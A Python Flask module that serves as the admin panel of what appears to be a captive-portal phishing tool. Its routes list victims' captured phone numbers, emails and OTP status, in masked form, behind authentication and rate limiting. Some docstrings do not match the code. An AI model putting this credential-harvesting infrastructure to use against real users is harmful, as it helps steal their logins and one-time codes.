"""Admin blueprint — gates the captured-credentials endpoint (S-2 + S-3).

Security fix S-2: every route that exposes captured credentials, runtime
config, or process state must pass through :func:`portal.security.admin_required`.
This module provides exactly one such route (``/admin/captured``) plus a
status page. Future operators may add ``/admin/config``, ``/admin/logs``,
etc., but they MUST use the same decorator — there is no "open" admin path.
"""

from __future__ import annotations

import logging
from typing import Optional

from flask import Blueprint, jsonify

from utils.logger import CredentialLogger
from core.events import EventBus
from portal.security import admin_required

logger = logging.getLogger("wimirage")

__all__ = ["build_admin_blueprint"]

# Brute-force ceiling on the basic-auth challenge (post-audit hardening).
# The admin surface previously accepted unlimited auth attempts; this caps
# any single source IP at 10 tries/minute. The limiter is per-route-closure
# and thread-safe (see ``core.captive_portal.rate_limit``).
ADMIN_AUTH_RATE_LIMIT = 10


def build_admin_blueprint(
    cred_logger: CredentialLogger,
    event_bus: Optional[EventBus] = None,
) -> Blueprint:
    """Return a Flask Blueprint exposing authenticated admin views.

    Args:
        cred_logger: Source of capture records surfaced via ``/admin/captured``.
        event_bus:   Optional bus; included in the status page if supplied.

    Returns:
        A Blueprint named ``"admin"`` mounted under ``/admin``.
    """
    bp = Blueprint("admin", __name__, url_prefix="/admin")

    # Lazy import: core.captive_portal imports this module at load time, so a
    # top-level import of ``rate_limit`` here would be circular. Same pattern
    # portal.routes uses for the validators.
    from core.captive_portal import rate_limit

    @bp.route("/captured")
    @rate_limit(max_requests=ADMIN_AUTH_RATE_LIMIT, window_seconds=60)
    @admin_required
    def captured():
        # Security fix S-3: redacted view of in-memory captures.
        # The full record includes phone/email/otp — never serve them to
        # the admin endpoint without the auth check (and we apply the
        # ``@admin_required`` decorator above for that). The JSON shape
        # only carries the timestamp/ip/stage so a leaked basic-auth
        # header still doesn't reveal captured credentials verbatim.
        records = [
            {
                "timestamp": c.timestamp,
                "client_ip": c.client_ip,
                "phone_masked": _mask_phone(c.phone),
                "email_masked": _mask_email(c.email),
                "has_otp": bool(c.otp),
                "stage": c.stage,
            }
            for c in cred_logger.get_all()
        ]
        return jsonify(
            {"count": len(records), "records": records}
        )

    @bp.route("/status")
    @rate_limit(max_requests=ADMIN_AUTH_RATE_LIMIT, window_seconds=60)
    @admin_required
    def status():
        bus_alive = event_bus.is_alive() if event_bus else False
        return jsonify(
            {"ok": True, "event_bus_alive": bus_alive}
        )

    @bp.route("/audit")
    @rate_limit(max_requests=ADMIN_AUTH_RATE_LIMIT, window_seconds=60)
    @admin_required
    def audit():
        # Operator-facing audit log tail. We don't surface token contents;
        # just the last 50 access records.
        from portal.security import scrub_for_log  # local to keep imports tight
        tail = getattr(cred_logger, "credentials", [])
        lines = [
            scrub_for_log(f"{c.timestamp} ip={c.client_ip} stage={c.stage}")
            for c in tail[-50:]
        ]
        return jsonify({"lines": lines})

    return bp


def _mask_phone(phone: Optional[str]) -> str:
    """Return ``+91*****1234``-style mask; empty input passes through.

    Rule: keep the first 3 && last 4 characters visible, mask everything
    between with ``*``. If the input is shorter than the visible-prefix
    sum (7), fully redact it. Trailing spaces and dashes are normalised
    out first so callers don't leak country-code separators.
    """
    if not phone:
        return ""
    # Normalise whitespace so masking is consistent.
    raw = phone.strip()
    # Short inputs (< 7 chars after stripping) get fully redacted; this
    # branch also avoids weird ``phone[:-2]`` behaviour in the slice path.
    if len(raw) <= 7:
        return "*" * len(raw)
    head, tail = raw[:3], raw[-4:]
    middle = "*" * (len(raw) - 7)
    return f"{head}{middle}{tail}"


def _mask_email(email: Optional[str]) -> str:
    """Return ``a***@example.com``-style mask; empty input passes through.

    Rule: keep the first character, mask the rest of the local-part with
    ``*``. The domain after ``@`` is left intact so operators can tell at
    a glance which provider is responsible for the capture.
    """
    if not email or "@" not in email:
        return ""
    local, domain = email.split("@", 1)
    if not local:
        return f"@{domain}"
    if len(local) == 1:
        return f"{local}@{domain}"
    return f"{local[0]}{'*' * (len(local) - 1)}@{domain}"
